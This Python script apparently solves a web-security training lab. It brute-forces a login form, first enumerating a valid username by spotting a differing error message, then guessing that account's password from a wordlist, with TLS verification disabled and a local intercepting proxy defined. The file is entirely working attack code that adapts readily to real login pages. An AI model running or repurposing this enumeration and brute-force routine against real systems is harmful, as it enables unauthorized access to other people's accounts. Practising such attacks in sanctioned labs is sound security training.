import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

def getUsername(url):
    with open('usernames.txt') as f:
        unames = f.read().split()
    for u in unames:
        data = {"username": u, "password": "admin"}
        r = requests.post(url, data=data, verify=False)
        if 'Invalid username or password.' not in r.text:
            print(f'[+] {u}')
            break

def getPassword(url):
    with open('passwords.txt') as f:
        passwds = f.read().split()
    for p in passwds:
        data = {"username": "accounts", "password": p}
        r = requests.post(url, data=data, verify=False)
        if 'Invalid username or password ' not in r.text:
            print(f'[+] {p}')
            break


# url = 'https://0ac6001304de184ec0c71590008900f4.web-security-academy.net/login'
# getUsername(url)
# getPassword(url)